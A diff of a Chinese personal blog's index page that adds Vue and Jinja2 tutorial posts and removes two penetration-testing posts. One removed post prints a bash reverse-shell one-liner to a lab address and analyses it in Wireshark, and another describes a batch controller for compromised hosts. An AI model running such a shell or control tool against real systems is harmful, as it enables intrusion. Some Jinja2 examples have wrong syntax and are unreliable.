@@ -155,6 +155,184 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/09/data-and-method/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="沫">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/04/09/data-and-method/" class="post-title-link" itemprop="url">Vue数据与方法</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-04-09 20:52:00 / 修改时间：21:26:13" itemprop="dateCreated datePublished" datetime="2020-04-09T20:52:00+08:00">2020-04-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vue%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">vue学习</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="什么是Vue的实例"><a href="#什么是Vue的实例" class="headerlink" title="什么是Vue的实例"></a>什么是Vue的实例</h3><p>官方给出的回答是：当一个Vue的实例被创建时，它将 data 对象中的所有的属性加入到 Vue 的响应式系统中。当这些属性的值发生改变时，视图将会产生“响应”，即匹配更新为新的值。具体不懂可以看上一章动态渲染.再说简单点就是你更改了Vue的返回的实例对象的值，它也会立马通过响应式去进行更改这个数据。</p>
+<h3 id="例子演示"><a href="#例子演示" class="headerlink" title="例子演示"></a>例子演示</h3><p>下面注释说明了一切，他这个数据，data一个是实参，一个是形参，你可以理解为你吃了一个苹果，我也吃了一个苹果，你的大一点，我的小一点，不是一个东西。当他数据发生改变的时候，因为vue是响应的，所以渲染的值也会发生改变。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>沫的第一个vue程序<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        &#123;&#123;a&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 创建一个变量来保存数据 可以理解为Vue的数据</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> data = &#123;a:<span class="number">1</span>&#125;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 这个app这个变量就是Vue的实例对象</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el:<span class="string">'#app'</span>,</span></span><br><span class="line">            data:data</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="actionscript">        <span class="comment">// 修改变量名a的值，同时页面进行更改</span></span></span><br><span class="line">        data.a = 3</span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>代码执行图如下</p>
+<p><img src="/images/pasted-152.png" alt="upload successful"></p>
+<h3 id="关闭响应系统-Object-freeze"><a href="#关闭响应系统-Object-freeze" class="headerlink" title="关闭响应系统-Object.freeze()"></a>关闭响应系统-Object.freeze()</h3><p>有的项目我们可能业务需求，就不需要vue的数据进行立马的改变，我们可以使用Object.freeze()这个方法，会阻止修改现有的数据，追踪变化，使用方法也很简单，给我们不想改变的数据作为参数丢进去就行</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        &#123;&#123;a&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 创建一个变量来保存数据 可以理解为Vue的数据</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> data = &#123;a:<span class="number">1</span>&#125;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">Object</span>.freeze(data)</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 这个app这个变量就是Vue的实例对象</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el:<span class="string">'#app'</span>,</span></span><br><span class="line">            data:data</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="actionscript">        <span class="comment">// 修改变量名a的值，同时页面进行更改</span></span></span><br><span class="line">        data.a = 3</span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>代码运行效果图</p>
+<p><img src="/images/pasted-153.png" alt="upload successful"></p>
+<h3 id="其他的实例属性与方法"><a href="#其他的实例属性与方法" class="headerlink" title="其他的实例属性与方法"></a>其他的实例属性与方法</h3><p>官方给出的是：除了数据属性，Vue 实例还暴露了一些有用的实例属性与方法。它们都有前缀 $，以便与用户定义的属性区分开来，也就是说，就像你定义jquery变量那样，一样写$符是有效的</p>
+<p>图下例子</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">       <span class="comment">// 创建一个变量来保存数据 可以理解为Vue的数据</span></span></span><br><span class="line"><span class="actionscript">       <span class="keyword">var</span> data = &#123;a:<span class="number">1</span>&#125;</span></span><br><span class="line"><span class="javascript">       <span class="built_in">Object</span>.freeze(data)</span></span><br><span class="line"><span class="actionscript">       <span class="comment">// 这个app这个变量就是Vue的实例对象</span></span></span><br><span class="line"><span class="actionscript">       <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">           el:<span class="string">'#app'</span>,</span></span><br><span class="line">           data:data</span><br><span class="line">       &#125;)</span><br><span class="line"><span class="actionscript">       <span class="comment">// 也就是说vue的el属性绑定也原生js的绑定的js是一样的，你可以理解为他内部是通过原生绑定来实现的</span></span></span><br><span class="line"><span class="javascript">       app.$el === <span class="built_in">document</span>.getElementById(<span class="string">'app'</span>) <span class="comment">// true</span></span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="watch方法"><a href="#watch方法" class="headerlink" title="watch方法"></a>watch方法</h3><p>如果你要使用这个方法，那么你必须吧这个方法写在改变这个值的前面，不然他是无法进行调用的，他回调接受了2个参数一个是改变后的值，一个是改变前的值</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 创建一个变量来保存数据 可以理解为Vue的数据</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> data = &#123;a:<span class="number">1</span>&#125;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 这个app这个变量就是Vue的实例对象</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">        el:<span class="string">'#app'</span>,</span></span><br><span class="line">        data:data</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// $watch 是一个实例方法</span></span></span><br><span class="line"><span class="actionscript">    app.$watch(<span class="string">'a'</span>,<span class="function"><span class="keyword">function</span><span class="params">(newValue,oldValue)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// app.a改变后调用</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'新的值是:'</span>+newValue)</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'旧的值是:'</span>+oldValue)</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="actionscript">    <span class="comment">// 对a属性进改变</span></span></span><br><span class="line">    app.a = 5</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>效果图</p>
+<p><img src="/images/pasted-154.png" alt="upload successful"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/04/jinja2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="沫">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/04/04/jinja2/" class="post-title-link" itemprop="url">pythonjinja2模板渲染语言详解</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-04-04 22:38:00 / 修改时间：23:05:22" itemprop="dateCreated datePublished" datetime="2020-04-04T22:38:00+08:00">2020-04-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%BC%80%E5%8F%91/" itemprop="url" rel="index">
+                    <span itemprop="name">web开发</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Jinja2模板语言介绍"><a href="#Jinja2模板语言介绍" class="headerlink" title="Jinja2模板语言介绍"></a>Jinja2模板语言介绍</h3><p>jinja2是一个python广泛使用的模板引擎，是由python语言实现的模板语言，他的设计思想来源于Django的模板引擎，并扩展了其语法及一系列的强大功能，尤其是flask框架内置的模板语言</p>
+<p>由于django默认模板引擎功能不齐全，速度慢，所以我们也可以在Django中使用jinja2，他的速度比Django默认的模板引擎快10-20倍</p>
+<h3 id="jinja2语法"><a href="#jinja2语法" class="headerlink" title="jinja2语法"></a>jinja2语法</h3><p>在jinja2中，存在三种语法 </p>
+<pre><code>1.控制结构 {% %}
+2.变量取值 { {} }
+3.注释{ # # }
+jinja2模板中使用{ {} }语法表示，他是一个变量，它是一种特殊的占位符，当利用janja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。</code></pre><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>变量可以通过”过滤器”进行修改，过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">常用的过滤器有</span><br><span class="line">safe: 渲染时值不转义</span><br><span class="line">capitialize: 把值的首字母转换成大写，其他子母转换为小写</span><br><span class="line">lower: 把值转换成小写形式</span><br><span class="line">upper: 把值转换成大写形式</span><br><span class="line">title: 把值中每个单词的首字母都转换成大写</span><br><span class="line">trim: 把值的首尾空格去掉</span><br><span class="line">striptags: 渲染之前把值中所有的HTML标签都删掉</span><br><span class="line">join: 拼接多个值为字符串</span><br><span class="line">replace: 替换字符串的值</span><br><span class="line">round: 默认对数字进行四舍五入，也可以用参数进行控制</span><br><span class="line">int: 把值转换成整型</span><br></pre></td></tr></table></figure>
+<p>只需要在变量后面使用管道|分割，多个过滤器可以链式调用，前一个过滤器的输出会作为后一个过滤器的输入。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">'abc'</span> | captialize  &#125;&#125;</span><br><span class="line"><span class="comment"># Abc</span></span><br><span class="line"></span><br><span class="line">&#123;&#123; <span class="string">'abc'</span> | upper  &#125;&#125;</span><br><span class="line"><span class="comment"># ABC</span></span><br><span class="line"></span><br><span class="line">&#123;&#123; <span class="string">'hello world'</span> | title  &#125;&#125;</span><br><span class="line"><span class="comment"># Hello World</span></span><br><span class="line"></span><br><span class="line">&#123;&#123; <span class="string">"hello world"</span> | replace(<span class="string">'world'</span>,<span class="string">'daxin'</span>) | upper &#125;&#125;</span><br><span class="line"><span class="comment"># HELLO DAXIN</span></span><br><span class="line"></span><br><span class="line">&#123;&#123; <span class="number">18.18</span> | round | int &#125;&#125;</span><br><span class="line"><span class="comment"># 18</span></span><br></pre></td></tr></table></figure>
+<p>我反正一般不用这玩意，都是在代码里面进行修改的</p>
+<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>jinja2的for循环用于迭代python的数据类型，包括列表，元组和字典，在jinja2中不存在while循环。</p>
+<p>1.迭代列表</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">&#123;% for user in users %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; user.username|title &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>2.迭代字典</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">&#123;% for key, value in my_dict.iteritems() %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>&#123;&#123; key &#125;&#125;<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>&#123;&#123; value&#125;&#125;<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a>if 语句</h3><p>jinja2的if语句，可以通过判断来进行代码块执行<br>1.一个简单的例子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 假设我们返回一个status值为1</span><br><span class="line">&#123;% if &#123;&#123;status&#125;&#125;&#x3D;&#x3D;0 %&#125;</span><br><span class="line">	&lt;div&gt;对不起你不满足条件&lt;&#x2F;div&gt;</span><br><span class="line">&#123;% elseif %&#125;</span><br><span class="line">	&lt;div&gt;满足条件了&lt;&#x2F;div&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="继承和super函数"><a href="#继承和super函数" class="headerlink" title="继承和super函数"></a>继承和super函数</h3><p>jinja2中最强大的功能就是模板继承了，他抽取模板的语法十分简单，在这里不好做演示，就不说了。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>jinjia2他的语法你可以理解为和python一摸一样，只是加了几个括号和百分号，理解起来十分的简单。学习难度很低，并且用于很高的效率。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/04/vue-dynamic-rendering/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -808,179 +986,6 @@
   
   
 
-        
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/05/bash-shell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="沫">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="沫的博客">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/05/bash-shell/" class="post-title-link" itemprop="url">shell反弹原理</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-03-05 19:56:00 / 修改时间：20:41:15" itemprop="dateCreated datePublished" datetime="2020-03-05T19:56:00+08:00">2020-03-05</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h3><pre><code>目标靶机：192.168.0.111  系统kali
-本机：192.168.0.14 系统 mac
-抓包工具：wireshark</code></pre><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前几天写了一个工具是批量管理shell工具，但是用起来总感觉不是很舒服，于是今天就给他进行了一次改动，emmm，今天这个用起来很舒服，所以就用我这个接收反弹shell的工具来进行实验了，这次主要以抓包为主。</p>
-<h4 id="开启shell接收工具"><a href="#开启shell接收工具" class="headerlink" title="开启shell接收工具"></a>开启shell接收工具</h4><p>我把工具改成了命令行传参，比较像nc把看起来，然后接收到shell直接进入shell，现在已经打开了监听模式<br><img src="/images/pasted-98.png" alt="upload successful"><br>使用靶机用bash把shell传过来</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.0.14/5555 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>已经成功获取到了shell，然后抓包查看整个过程<br><img src="/images/pasted-99.png" alt="upload successful"></p>
-<h4 id="开始抓包"><a href="#开始抓包" class="headerlink" title="开始抓包"></a>开始抓包</h4><p>wireshark需要对包进行过滤，不然网卡流量很大的，你是无法抓取到准确的包</p>
-<p>这句话的意思是只抓取来源地址是192.168.0.14并且是tcp请求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr &#x3D;&#x3D; 192.168.0.14 and tcp</span><br></pre></td></tr></table></figure>
-<p>建立tcp请求，syn包发起请求<br><img src="/images/pasted-100.png" alt="upload successful"><br>tcp请求建立结束后，kali主动给服务器发送了一个包，图二</p>
-<p><img src="/images/pasted-101.png" alt="upload successful"></p>
-<p><img src="/images/pasted-102.png" alt="upload successful"><br>我发了一个ls指令</p>
-<p><img src="/images/pasted-103.png" alt="upload successful"></p>
-<p><img src="/images/pasted-104.png" alt="upload successful"></p>
-<p><img src="/images/pasted-105.png" alt="upload successful"></p>
-<p>整个过程抓包简单呈现，如果不懂tcp三次握手建立连接的，先去读tcp，最后的fin关闭包就说了，我执行了exit，触发了fin。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/shell-control/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="沫">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="沫的博客">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/03/04/shell-control/" class="post-title-link" itemprop="url">批量shell控制</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-03-04 17:07:00" itemprop="dateCreated datePublished" datetime="2020-03-04T17:07:00+08:00">2020-03-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-20 20:35:50" itemprop="dateModified" datetime="2020-03-20T20:35:50+08:00">2020-03-20</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制"><a href="#emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制" class="headerlink" title="emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制"></a>emm最近看了很多木马控制的工具，但是一直想弄懂他是怎么实现的，于是今天就用了半天时间做了这个实验，使用python去进行批量肉鸡控制</h3><h4 id="1-实现socket监听"><a href="#1-实现socket监听" class="headerlink" title="1.实现socket监听"></a>1.实现socket监听</h4><p><img src="/images/pasted-90.png" alt="upload successful"></p>
-<p>上面代码基本意思就是端口复用，并且监听一个端口服务，因为木马都是主动发起tcp请求进行连接，为了达到批量的效果，我选择使用了一个列表进行保存，在接收到shell的时候，就把这个shell对象写到一个字典里面，然后通过列表进行保存.</p>
-<h4 id="2-获取监听内容"><a href="#2-获取监听内容" class="headerlink" title="2.获取监听内容"></a>2.获取监听内容</h4><p><img src="/images/pasted-91.png" alt="upload successful"><br>这个步骤就是看回显了，我本来尝试用utf-8进行解码，然后一直报错，百度了一下可以使用gb2312和gbk对windows解码。</p>
-<h4 id="3-发送指令执行"><a href="#3-发送指令执行" class="headerlink" title="3.发送指令执行"></a>3.发送指令执行</h4><p><img src="/images/pasted-93.png" alt="upload successful"><br>emm其实只要满足这三点就可以进行shell操作了，外加上一个循环，不过因为我需要做的是批量shell控制所以就还得多加一点代码，在执行语句的时候一定要加上这些换行符，不然是不生效的代码。</p>
-<h4 id="4-批量编写"><a href="#4-批量编写" class="headerlink" title="4.批量编写"></a>4.批量编写</h4><p><img src="/images/pasted-94.png" alt="upload successful"><br>emmm 看前三个其实并没啥用，cmd继承类server这个类，是因为我需要用到一些server类的一些方法。</p>
-<p><img src="/images/pasted-95.png" alt="upload successful"><br>这个对象是获取socket对象的，只要列表里面存在这个ip地址那么就返回该socket的对象，这样就可以进行命令执行了</p>
-<h4 id="5-执行命令"><a href="#5-执行命令" class="headerlink" title="5.执行命令"></a>5.执行命令</h4><p><img src="/images/pasted-96.png" alt="upload successful"><br>有了这些对象，开启了消息监听就是我们最开始那个阻塞recv获取消息的函数，发送命令也是前面的。。。</p>
